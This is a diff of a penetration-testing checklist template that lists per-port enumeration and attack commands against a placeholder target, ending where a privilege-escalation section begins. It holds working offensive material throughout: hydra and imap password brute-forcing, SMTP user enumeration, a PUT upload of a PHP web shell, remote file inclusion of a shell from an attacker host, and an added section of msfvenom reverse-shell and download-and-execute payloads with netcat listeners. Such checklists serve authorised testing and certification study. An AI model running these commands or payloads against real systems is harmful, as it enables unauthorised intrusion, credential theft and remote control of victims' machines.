@@ -1,253 +1,175 @@
 # Info-sheet
-msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe -o shell.exe
 
 - DNS-Domain name:
 - Host name:
 - OS:
-- Server:
 - Workgroup:
 - Windows domain:
 
 ### Full TCP Scan
-
 INSERTFULLTCPSCAN
-
+```
+nmap -sV -Pn -p1-65535 --max-retries 1 --max-scan-delay 10 --defeat-rst-ratelimit --open -T4 INSERTIPADDRESS
+```
 ### Full UDP Scan
-
 INSERTUDPSCAN
-
+```
+nmap -Pn -A -sC -sU -T 4 --top-ports 200 INSERTIPADDRESS
+```
 ### Vuln Scan
 INSERTVULNSCAN
-
+```
+nmap --script=vuln INSERTIPADDRESS
+```
+### Other scans
 ```
 Always start with a stealthy scan to avoid closing ports.
 
 # Syn-scan
 nmap -sS INSERTIPADDRESS
 
-# Service-version, default scripts, OS:
-nmap INSERTIPADDRESS -sV -sC -O
-
-# Scan all ports, might take a while.
-nmap INSERTIPADDRESS -p-
-
-# Scan for UDP
-nmap INSERTIPADDRESS -sU
-unicornscan -mU -v -I INSERTIPADDRESS
-
 # Connect to udp if one is open
 nc -u INSERTIPADDRESS 48772
+
+# Connect to tcp if one is open
+nc -nv INSERTIPADDRESS 5472
 
 # Monster scan
 nmap INSERTIPADDRESS -p- -A -T4 -sC
 
-# Vulnerability Scan
-nmap --script=vuln INSERTIPADDRESS
 ```
 
-
 ### Port 21 - FTP
-
-- Name:
-- Version:
-- Anonymous login:
-
 INSERTFTPTEST
 
 ```
 nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS
+hydra -I -e ns -l administrator -P /usr/share/wordlists/rockyou.txt ftp://INSERTIPADDRESS
 ```
 
 ### Port 22 - SSH
-
-- Name:
-- Version:
-- Protocol:
-- RSA-key-fingerprint:
-- Takes-password:
-If you have usernames test login with username:username
-
 INSERTSSHCONNECT
 
 INSERTSSHBRUTE
 
 ```
-hydra -I -t 5 -l username -P passwordfile INSERTIPADDRESS -e ns
+hydra -I -e ns -l administrator -P /usr/share/wordlists/rockyou.txt ssh://INSERTIPADDRESS
 ```
 
 ### Port 25 - SMTP
-
-- Name:
-- Version:
-- VRFY:
-- EXPN:
-
 INSERTSMTPCONNECT
 
 ```
-nc -nvv INSERTIPADDRESS 25
-HELO foo<cr><lf>
-
 nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
+smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/http_default_users.txt -t INSERTIPADDRESS
+smtp-user-enum -M EXPN -U /usr/share/wordlists/metasploit/http_default_users.txt-t INSERTIPADDRESS
+smtp-user-enum -M RCPT -U /usr/share/wordlists/metasploit/http_default_users.txt -t INSERTIPADDRESS
 ```
 
 ### Port 110 - Pop3
-
-- Name:
-- Version:
-
 INSERTPOP3CONNECT
 
+```
+telnet INSERTIPADDRESS 110
+USER pelle@INSERTIPADDRESS
+PASS admin
+or:
+USER pelle
+PASS admin
+# List all emails
+list
+stat
+# Retrieve email number 5, for example
+retr 9
+```
+
+### Port 143/993 - Imap
+```
+nmap -p 143,993 --script imap-brute INSERTIPADDRESS
+```
+
 ### Port 135 - MSRPC
-
-Some versions are vulnerable on Windows
-
 INSERTRPCMAP
 
+### Port 111 - Rpcbind
 ```
-nmap INSERTIPADDRESS --script=msrpc-enum
-```
-
-Exploit:
-
-```
-msf > use exploit/windows/dcerpc/ms03_026_dcom
-searchsploit 03-026
-
+rpcinfo -p INSERTIPADDRESS
 ```
 
 ### Port 139/445 
-
-### SMBmap
 INSERTSMBMAP
 
 ```
 mkdir /tmp/share
 mount -t cifs //INSERTIPADDRESS/C$ /tmp/share
 ```
-
 ### Password Policy
 INSERTSAMRDUMP
 
 ```
-nmap --script=smb-* INSERTIPADDRESS -p 445
-
+https://blog.ropnop.com/using-credentials-to-own-windows-boxes/
 enum4linux -a INSERTIPADDRESS
-
 rpcclient -U "" INSERTIPADDRESS
-	srvinfo
-	enumdomusers
-	getdompwinfo
-	querydominfo
-	netshareenum
-	netshareenumall
-
-smbclient -L INSERTIPADDRESS
-smbclient //INSERTIPADDRESS/tmp
-smbclient //INSERTIPADDRESS/admin$
-smbclient //INSERTIPADDRESS/c$
-smbclient //INSERTIPADDRESS/ipc$
-smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
-smbclient //INSERTIPADDRESS/ipc$ -U john
-smbclient //INSERTIPADDRESS/admin$ -U john
-
-Log in with shell:
-winexe -U username //INSERTIPADDRESS "cmd.exe" --system
-
-crackmap -u <user> -p <pass> --users/shares/sessions/wmi...
+smbclient //INSERTIPADDRESS/ipc$ 
 ```
 
 ### Port 161/162 UDP - SNMP
-
 Look for installed programs and other ports that are opened and may have been missed
+INSERTSNMPSCAN
 
 ```
 nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
 onesixtyone -c /root/Dropbox/Wordlists/wordlist-common-snmp-community-strings.txt INSERTIPADDRESS
 snmp-check INSERTIPADDRESS -c public
-```
-
-```
 # Common community strings
 public
 private
 community
 ```
 
-INSERTSNMPSCAN
-
 ### Port 443 - HTTPS
-
 INSERTSSLSCAN
 
 ```
 sslscan INSERTIPADDRESS:443
 ```
 
-### Port 554 - RTSP
-
-
 ### Port 1030/1032/1033/1038
-
-Used by RPC to connect in domain network. Usually nothing.
-
-### Port 1433 - MSSQL
-
-- Version:
-
-```
-use auxiliary/scanner/mssql/mssql_ping
-
-# Last options. Brute force.
-scanner/mssql/mssql_login
-
-# Log in to mssql
-sqsh -S INSERTIPADDRESS -U sa
-
-# Execute commands
-xp_cmdshell 'date'
-go
-```
-
-If you have credentials look in metasploit for other modules.
+Used by RPC to connect in domain network.
 
 ### Port 1521 - Oracle
 
-Name:
-Version:
-Password protected:
+- Name:
+- Version:
+- Password protected:
 
 ```
 tnscmd10g version -h INSERTIPADDRESS
 tnscmd10g status -h INSERTIPADDRESS
 ```
 
-
-### Port 2100 - Oracle XML DB
-
-Can be accessed through ftp.
-Some default passwords here: https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
-- Name:
-- Version:
-
-Default logins:
-
-```
-sys:sys
-scott:tiger
-```
-
 ### Port 2049 - NFS
-
 INSERTNFSSCAN
 
 ```
 showmount -e INSERTIPADDRESS
-
 If you find anything you can mount it like this:
-
 mount INSERTIPADDRESS:/ /tmp/NFS
 mount -t INSERTIPADDRESS:/ /tmp/NFS
+```
+
+### Port 2100 - Oracle XML DB
+
+- Name:
+- Version:
+- Default logins:
+
+```
+sys:sys
+scott:tiger
+
+Default passwords
+https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
 ```
 
 ### 3306 - MySQL
@@ -256,9 +178,9 @@ mount -t INSERTIPADDRESS:/ /tmp/NFS
 - Version:
 
 ```
-mysql --host=INSERTIPADDRESS -u root -p
+nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse INSERTIPADDRESS -p 3306
 
-nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 INSERTIPADDRESS -p 3306
+mysql --host=INSERTIPADDRESS -u root -p
 ```
 
 ### Port 3339 - Oracle web interface
@@ -268,108 +190,75 @@ nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-emp
 - Scripting language:
 - Apache Modules:
 - IP-address:
-- Domain-name address:
-
-### Port 3389 - Remote desktop
-
-Test logging in to see what OS is running
-
-```
-rdesktop -u guest -p guest INSERTIPADDRESS -g 94%
-
-# Brute force
-ncrack -vv --user Administrator -P /usr/share/wordlists/rockyou.txt rdp://INSERTIPADDRESS
-hydra -I -t 4 -L /root/Dropbox/Wordlists/quick_hit.txt -P /root/Dropbox/Wordlists/quick_hit.txt  rdp://INSERTIPADDRESS
-```
-
 
 ## Webservers 
 
 ### Automated Checks
-
 INSERTWIGSCAN
 
 INSERTWIGSSLSCAN
-
+```
+wig-git -t 50 -q -d http://INSERTIPADDRESS/path
+```
 ### Nikto scan
-
 INSERTNIKTOSCAN
+```
+# Full Nikto
+nikto -h http://INSERTIPADDRESS
 
+# Nikto with squid proxy
+nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444
+```
 ### Directories
-
 INSERTDIRBSCAN
 
 INSERTDIRBSSLSCAN
+```
+# Common directories and extensions
+gobuster -u http://INSERTIPADDRESS -e -n -w /usr/share/wordlists/dirb/common.txt -t 100 -x .php,.asp,.html,.pl,.js,.py,.aspx,.htm,.xhtml
 
+# Most directories and extension
+gobuster -u http://INSERTIPADDRESS -e -n -f -w /usr/share/wordlists/dirb/big.txt -t 100 -x .asp,.aspx,.bat,.c,.cfm,.cgi,.com,.dll,.exe,.htm,.html,.inc,.jhtml,.jsa,.jsp,.log,.mdb,.nsf,.php,.phtml,.pl,.reg,.sh,.shtml,.sql,.txt,.xml
+
+```
 ### Robots
-
 INSERTROBOTS
 
 ### Default/Weak login
-
 Google documentation for default passwords and test them:
-
 ```
-site:webapplication.com password
+http://open-sez.me/
 https://cirt.net/passwords
-```
-``` 
-Browse around and look for disclosed PII on site
-
-*Place anything here
 ```
 
 ### Manual Checks
 
 ```
 Step 1:
-View Source
+View Source/Page for PII
 
 Step 2: 
 # Start Secondary Scans
 
-Common directories and extensions
-gobuster -u http://INSERTIPADDRESS -e -n -w /usr/share/wordlists/dirb/common.txt -t 100 -x .php,.asp,.html,.pl,.js,.py,.aspx,.htm,.xhtml
-
-Most directories and extension
-gobuster -u http://INSERTIPADDRESS -e -n -f -w /usr/share/wordlists/dirb/big.txt -t 100 -x .asp,.aspx,.bat,.c,.cfm,.cgi,.com,.dll,.exe,.htm,.html,.inc,.jhtml,.jsa,.jsp,.log,.mdb,.nsf,.php,.phtml,.pl,.reg,.sh,.shtml,.sql,.txt,.xml
-
-wig-git -t 50 -q -d http://INSERTIPADDRESS/path
-
-# CMS checker 
-cmsmap-git -t http://INSERTIPADDRESS
-
-# Full Nikto
-nikto -h http://INSERTIPADDRESS
-
-# Nikto with squid proxy
-nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444
-
-# Get header
-curl -i INSERTIPADDRESS
-
-# Get everything
+# Get header and page
 curl -i -L INSERTIPADDRESS
 
 # Check if it is possible to upload using put
+curl --user login:password --upload-file your.file.txt http://INSERTIPADDRES
 curl -v -X OPTIONS http://INSERTIPADDRESS/
 curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
 
 # Check for title and all links
-dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o windows
-
-#To append a .pl to the end of the resolutions:
-dirb http://INSERTIPADDRESS/somedirectory -X .pl
-
+dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
 ```
 
 ### WebDav
 
 ```
-Try to put a shell.asp
-cd /root/Dropbox/Engagements/INSERTIPADDRESS/exploit && msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f asp -o shell.asp
-
 cadaver INSERTIPADDRESS
+Try to put a shell.asp
+
+cd /root/Dropbox/Engagements/INSERTIPADDRESS/exploit && msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f asp -o shell.asp
 
 put /root/Dropbox/Engagements/INSERTIPADDRESS/exploit/shell.asp
 If the .asp extention is not allowed, try shell.asp.txt and use the mv command
@@ -407,17 +296,9 @@ base64 -d output of above
 python -m SimpleHTTPServer 80
 http://INSERTIPADDRESS/page=http://10.11.0.150/shell.txt%00
 http://INSERTIPADDRESS/page=http://10.11.0.150/shell.txt?
-
-# Shell Creation
-msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.exe -f raw -o shell.php
-msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe > shell.exe
-python -m SimpleHTTPServer 80
-
-nc -nvlp 443
 ```
 
-
-### SQL-Injection
+### Sql-login-bypass
 
 ```
 # Login Bypass Checks
@@ -429,19 +310,7 @@ Username/Password:
 'or '1'='1' ({
 'or '1'='1' /*
 
-# Post
-./sqlmap.py -r search-test.txt -p tfUPass
-
-# Get
-sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql
-
-# Crawl
-sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
-```
-
-### Sql-login-bypass
-
-```
+# Automated
 - Open Burp-suite
 - Make and intercept request
 - Send to intruder
@@ -451,19 +320,25 @@ sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
 - Check for response length variation
 ```
 
+### SQL-Injection
+
+```
+# Post
+get post request from Burp and save as search-test.txt
+sqlmap -r search-test.txt -p tfUPass
+
+# Get
+sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql
+
+# Crawl
+sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
+```
+
 ### Password brute force - last resort
 
 ```
 cewl http://INSERTIPADDRESS
 ```
-
-## Vulnerability analysis
-
-Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilities and features.
-
-### To try - List of possibilities
-Add possible exploits here:
-
 
 ### Find sploits - Searchsploit and google
 
@@ -481,18 +356,34 @@ searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"
 searchsploit -t Apache | grep -v '/dos/'
 ```
 
+#Shellcode
+```
+# Binary
+msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f exe -o shell.exe
+nc -lvnp 4444
 
+# PHP Download Execute
+msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.elf -f raw -o shell.php
+msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f exe -o shell.exe
+python -m SimpleHTTPServer 80
+nc -lvnp 443
+
+# PHP
+msfvenom -p php/reverse_php LHOST=MYIPADDRESS LPORT=80 -f raw -o shell.php
+*use meterpreter multihandler
+
+# ASP
+msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f asp -o shell.asp
+nc -lvnp 443
+```
 ----------------------------------------------------------------------------
-
-
-
-
 
 
 -----------------------------------------------------------------------------
 # Privesc
 
 ### First Steps
+
 ```
 Upload files
 Host:
